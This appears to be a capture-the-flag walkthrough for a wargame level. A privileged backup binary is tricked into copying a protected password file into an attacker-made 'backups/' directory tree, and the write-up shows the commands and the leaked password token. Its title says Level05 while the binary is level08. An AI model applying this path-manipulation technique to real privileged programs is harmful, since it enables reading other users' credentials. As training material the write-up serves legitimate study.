# Level05

## Description

The provided executable takes a file path as its argument. It then copies the content of that file into a corresponding file inside a `backups/` directory.

Our objective is to retrieve the password stored in `~/level09/.pass`.

## First Attempt

We try to read the password file directly:

```bash
./level08 ~/level09/.pass
```

Output:

```text
ERROR: Failed to open /home/users/level08/level09/.pass
```

The program fails because it attempts to open the file directly, and we don't have permission to access it.

---

## Second Attempt

Let's try using the absolute path:

```bash
./level08 /home/users/level09/.pass
```

Output:

```text
ERROR: Failed to open ./backups//home/users/level09/.pass
```

This is interesting.

Instead of refusing the path, the program prepends `./backups/` to the user-supplied filename. It expects the destination path to already exist, but it never validates whether that path is legitimate.

---

## Exploitation

Since we are allowed to create directories in our working directory, we can recreate the expected folder hierarchy:

```bash
mkdir -p backups/home/users/level09
```

Now we execute the program again:

```bash
~/level08 /home/users/level09/.pass
```

The file is successfully copied into our controlled `backups/` directory.

We can then read its contents:

```bash
cat backups/home/users/level09/.pass
```

Output:

```text
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

---

## Why it Works

The vulnerability comes from the fact that the program:

- accepts an arbitrary file path as input;
- blindly prefixes it with `./backups/`;
- never validates or sanitizes the resulting path;
- assumes the destination directory already exists.

By creating the expected directory structure ourselves, we trick the program into copying a protected file into a location we control, allowing us to read its contents.
